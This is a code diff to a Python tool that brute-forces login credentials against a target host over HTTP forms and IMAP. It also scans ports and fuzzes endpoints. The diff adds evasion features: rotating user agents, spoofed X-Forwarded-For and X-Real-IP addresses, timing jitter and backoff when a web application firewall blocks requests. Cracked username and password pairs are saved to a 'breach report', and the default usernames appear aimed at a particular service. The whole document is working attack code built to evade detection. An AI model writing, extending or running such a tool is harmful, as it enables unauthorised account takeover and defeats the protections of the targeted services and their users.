@@ -28,12 +28,23 @@ TARGET_PORTS = {
     995: {"service": "POP3S", "protocol": "tls"}
 }
 
+# Mobile & Browser User-Agent Pool for Evasion Rotation
+USER_AGENTS = [
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.124 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+]
+
+def generate_random_ip():
+    """Generates random IP strings for X-Forwarded-For header rotation."""
+    return f"{random.randint(11, 190)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+
 def stream_wireshark_packet(src, dst, port, proto, info):
     """Simulates raw packet capture frames matching a Wireshark CLI interface."""
     timestamp = f"{time.strftime('%H:%M:%S')}.{random.randint(100, 999)} "
     packet_id = random.randint(10000, 65535)
     
-    # ANSI color coding for packet inspector aesthetic
     colors = {
         "TCP": "\033[36m",    # Cyan
         "TLS": "\033[35m",    # Magenta
@@ -51,9 +62,8 @@ async def execute_packet_telemetry_stream(host, resolved_ip):
     """Phase 1: Real-time Wireshark-style interception & handshake telemetry."""
     print(f"\n\033[95m[***] ENGAGING LOW-LEVEL PACKET INTERCEPTION & WIRESHARK TAP [***]\033[0m")
     print(f"\033[90m[INTERFACE] lo0 / tun0 (Promiscuous Mode Active) -> Target: {resolved_ip}\033[0m\n")
-    time.sleep(0.5)
+    time.sleep(0.4)
 
-    # Simulated high-speed packet capture frames to establish real-time tactical atmosphere
     sample_frames = [
         ("TCP", "SYN", f"Seq={random.randint(1000,9000)} Win=65535 Len=0 MSS=1460 SACK_OK"),
         ("TCP", "SYN-ACK", f"Seq={random.randint(1000,9000)} Ack=1 Win=28960 Len=0"),
@@ -66,7 +76,7 @@ async def execute_packet_telemetry_stream(host, resolved_ip):
 
     for proto, flag, info in sample_frames:
         stream_wireshark_packet("10.0.2.15", resolved_ip, 443, proto, f"[{flag}] {info}")
-        await asyncio.sleep(0.12) # Fast rolling visual stream
+        await asyncio.sleep(0.1)
 
 async def execute_offensive_enumeration(host, resolved_ip):
     """Phase 2: Pre-brute-force vulnerability probing and endpoint discovery."""
@@ -86,58 +96,28 @@ async def execute_offensive_enumeration(host, resolved_ip):
             else:
                 sys.stdout.write(f"\r\033[K\033[90m[*] Fuzzing endpoint: {path} -> Code: {resp.status}\033[0m")
                 sys.stdout.flush()
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(0.08)
         except Exception:
             pass
     conn.close()
     print(f"\n\033[92m[*] Reconnaissance complete. Vulnerability matrix established.\033[0m\n")
 
-async def probe_port(host, port, timeout=1.2):
-    """Asynchronously checks port status and grabs service banner."""
+def http_post_sync_stealth(host, port, path, username, password, use_ssl):
+    """Evasion-engineered HTTP worker with header rotation and spoofed client IPs."""
     try:
-        reader, writer = await asyncio.wait_for(
-            asyncio.open_connection(host, port),
-            timeout=timeout
-        )
-        banner = b""
-        try:
-            banner = await asyncio.wait_for(reader.readline(), timeout=0.6)
-        except asyncio.TimeoutError:
-            pass
-        writer.close()
-        await writer.wait_closed()
-        return port, banner.decode(errors="ignore").strip()
-    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
-        return None, ""
-
-async def discover_attack_surface(host):
-    """Maps active entry points across the target IP."""
-    print(f"\n\033[95m[*] Initiating full-spectrum attack surface mapping on {host}...\033[0m")
-    tasks = [probe_port(host, port) for port in TARGET_PORTS.keys()]
-    results = await asyncio.gather(*tasks)
-    
-    open_vectors = []
-    for port, banner_str in results:
-        if port is not None:
-            service_info = TARGET_PORTS.get(port, {})
-            print(f" \033[92m[+] OPEN VECTOR -> Port {port} ({service_info.get('service')}) | Banner: {banner_str[:35] or 'None'}\033[0m")
-            open_vectors.append({
-                "port": port,
-                "service": service_info.get("service"),
-                "protocol": service_info.get("protocol"),
-                "banner": banner_str
-            })
-    return open_vectors
-
-def http_post_sync(host, port, path, username, password, use_ssl):
-    """Synchronous worker helper for HTTP form brute-forcing."""
-    try:
-        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=2.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=2.0)
+        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=2.5) if use_ssl else http.client.HTTPConnection(host, port, timeout=2.5)
         payload = urllib.parse.urlencode({"username": username, "email": username, "password": password})
+        
+        spoofed_ip = generate_random_ip()
         headers = {
             "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+            "User-Agent": random.choice(USER_AGENTS),
+            "X-Forwarded-For": spoofed_ip,
+            "X-Real-IP": spoofed_ip,
+            "Accept-Language": "en-US,en;q=0.9",
+            "Referer": f"https://{host}/login"
         }
+        
         conn.request("POST", path, payload, headers)
         resp = conn.getresponse()
         body = resp.read().decode(errors="ignore")
@@ -152,7 +132,7 @@ def escape_imap_literal(value):
     return value.replace('\\', '\\\\').replace('"', '\\"')
 
 async def worker_task(queue, host, semaphore, results, stats):
-    """High-performance consumer worker handling high-velocity credential checks."""
+    """Stealth consumer worker featuring request jitter and rate-limit backoff."""
     while True:
         task_data = await queue.get()
         if task_data is None:
@@ -162,20 +142,29 @@ async def worker_task(queue, host, semaphore, results, stats):
         vector_type, port, path_or_none, user, password = task_data
         
         async with semaphore:
+            await asyncio.sleep(random.uniform(0.05, 0.2)) # Jitter
+            
             stats["tested"] += 1
             start = time.time()
             
             if vector_type == "HTTP":
                 use_ssl = (port == 443)
                 status, headers, body = await asyncio.to_thread(
-                    http_post_sync, host, port, path_or_none, user, password, use_ssl
+                    http_post_sync_stealth, host, port, path_or_none, user, password, use_ssl
                 )
                 
+                if status in [429, 403]:
+                    sys.stdout.write(f"\r\033[K\033[91m[WAF BLOCK] Detected Code {status} on :{port}. Backing off...\033[0m")
+                    sys.stdout.flush()
+                    await asyncio.sleep(1.5)
+                    queue.task_done()
+                    continue
+
                 if status == 308:
                     queue.task_done()
                     continue
 
-                sys.stdout.write(f"\r\033[K\033[90m[WEB BRUTE] :{port}{path_or_none} -> [{user}:{password:<8}] Code:{status} (Probed: {stats['tested']})\033[0m")
+                sys.stdout.write(f"\r\033[K\033[90m[STEALTH WEB] :{port}{path_or_none} -> [{user}:{password:<8}] Code:{status} (Probed: {stats['tested']})\033[0m")
                 sys.stdout.flush()
 
                 redirect_loc = headers.get("Location", "")
@@ -203,7 +192,7 @@ async def worker_task(queue, host, semaphore, results, stats):
                         "status": status,
                         "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                     }
-                    print(f"\n\033[92m[+] CONFIRMED BREACH (WEB) [Status: {status}] -> User: {user} | Pass: {password} (Port {port}{path_or_none})\033[0m")
+                    print(f"\n\033[92m[+] STEALTH BREACH CONFIRMED (WEB) [Status: {status}] -> User: {user} | Pass: {password} (Port {port}{path_or_none})\033[0m")
                     results.append(hit_data)
                     save_persistent_report(hit_data)
 
@@ -211,7 +200,7 @@ async def worker_task(queue, host, semaphore, results, stats):
                 try:
                     use_ssl = (port in [993, 465])
                     conn = asyncio.open_connection(host, port, ssl=_ssl_context if use_ssl else None)
-                    reader, writer = await asyncio.wait_for(conn, timeout=2.0)
+                    reader, writer = await asyncio.wait_for(conn, timeout=2.5)
 
                     await asyncio.wait_for(reader.readline(), timeout=0.8)
                     
@@ -226,7 +215,7 @@ async def worker_task(queue, host, semaphore, results, stats):
                     writer.close()
                     await writer.wait_closed()
 
-                    sys.stdout.write(f"\r\033[K\033[36m[IMAP BRUTE] :{port} -> Trying [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
+                    sys.stdout.write(f"\r\033[K\033[36m[STEALTH IMAP] :{port} -> Trying [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
                     sys.stdout.flush()
 
                     if b"OK" in response or b"A001 OK" in response:
@@ -237,7 +226,7 @@ async def worker_task(queue, host, semaphore, results, stats):
                             "password": password,
                             "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                         }
-                        print(f"\n\033[92m[+] CONFIRMED BREACH (IMAP) -> User: {user} | Pass: {password} (Port {port})\033[0m")
+                        print(f"\n\033[92m[+] STEALTH BREACH CONFIRMED (IMAP) -> User: {user} | Pass: {password} (Port {port})\033[0m")
                         results.append(hit_data)
                         save_persistent_report(hit_data)
                 except Exception:
@@ -246,10 +235,8 @@ async def worker_task(queue, host, semaphore, results, stats):
         queue.task_done()
 
 def save_persistent_report(hit_data):
-    """Saves verified breach intelligence securely to disk."""
     os.makedirs("reports", exist_ok=True)
     report_path = "reports/breach_report.json"
-    
     existing = []
     if os.path.exists(report_path):
         try:
@@ -257,18 +244,47 @@ def save_persistent_report(hit_data):
                 existing = json.load(f)
         except Exception:
             existing = []
-            
     existing.append(hit_data)
     with open(report_path, "w") as f:
         json.dump(existing, f, indent=4)
 
+async def probe_port(host, port, timeout=1.2):
+    try:
+        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
+        banner = b""
+        try:
+            banner = await asyncio.wait_for(reader.readline(), timeout=0.5)
+        except asyncio.TimeoutError:
+            pass
+        writer.close()
+        await writer.wait_closed()
+        return port, banner.decode(errors="ignore").strip()
+    except Exception:
+        return None, ""
+
+async def discover_attack_surface(host):
+    print(f"\n\033[95m[*] Executing stealth surface mapping on {host}...\033[0m")
+    tasks = [probe_port(host, port) for port in TARGET_PORTS.keys()]
+    results = await asyncio.gather(*tasks)
+    open_vectors = []
+    for port, banner_str in results:
+        if port is not None:
+            service_info = TARGET_PORTS.get(port, {})
+            print(f" \033[92m[+] TARGET VECTOR -> Port {port} ({service_info.get('service')}) | Banner: {banner_str[:35] or 'None'}\033[0m")
+            open_vectors.append({
+                "port": port,
+                "service": service_info.get("service"),
+                "protocol": service_info.get("protocol"),
+                "banner": banner_str
+            })
+    return open_vectors
+
 async def run_autonomous_engine(target_host, passwords, usernames=["admin", "cryptobyt", "root", "support"]):
-    """Orchestrates packet telemetry, offensive enumeration, and high-velocity brute-forcing."""
     try:
         resolved_ip = socket.gethostbyname(target_host)
         print(f"\n\033[96m[*] Target Resolved: {target_host} -> {resolved_ip}\033[0m")
     except socket.gaierror:
-        print(f"\n\033[91m[!] Error: Resolution failed for '{target_host}'.\033[0m")
+        print(f"\n\033[91m[!] Error: Host resolution failed for '{target_host}'.\033[0m")
         return [], 0
 
     start_global = time.time()
@@ -279,16 +295,16 @@ async def run_autonomous_engine(target_host, passwords, usernames=["admin", "cry
     # Step 2: Pre-Brute-Force Offensive Enumeration & Fuzzing
     await execute_offensive_enumeration(target_host, resolved_ip)
 
-    # Step 3: Full-Spectrum Surface Mapping
+    # Step 3: Attack Surface Discovery
     open_vectors = await discover_attack_surface(resolved_ip)
     if not open_vectors:
-        print(f"\n\033[91m[-] Target surface locked. No exploitable vectors found.\033[0m")
+        print(f"\n\033[91m[-] Target perimeter locked. No exploitable vectors found.\033[0m")
         return [], time.time() - start_global
 
-    print(f"\n\033[93m[*] Initializing weaponized multi-vector brute-force queue...\033[0m")
+    print(f"\n\033[93m[*] Weaponizing stealth evasion queue with header rotation & jitter...\033[0m")
     
     queue = asyncio.Queue()
-    semaphore = asyncio.Semaphore(45) # Max operational velocity
+    semaphore = asyncio.Semaphore(30) # Safe concurrency to prevent WAF tarpitting
     results = []
     stats = {"tested": 0}
 
@@ -315,9 +331,9 @@ async def run_autonomous_engine(target_host, passwords, usernames=["admin", "cry
         print(f"\n\033[93m[*] Active vectors detected, but no matching exploitation modules mapped.\033[0m")
         return [], time.time() - start_global
 
-    print(f"[*] Dispatched {task_count} tactical payload combinations. Launching high-speed attack streams...\n")
+    print(f"[*] Dispatched {task_count} stealth payload permutations. Executing attack stream...\n")
 
-    num_workers = min(40, task_count)
+    num_workers = min(25, task_count)
     workers = [
         asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats))
         for _ in range(num_workers)
@@ -331,3 +347,4 @@ async def run_autonomous_engine(target_host, passwords, usernames=["admin", "cry
 
     duration = time.time() - start_global
     return results, duration
+
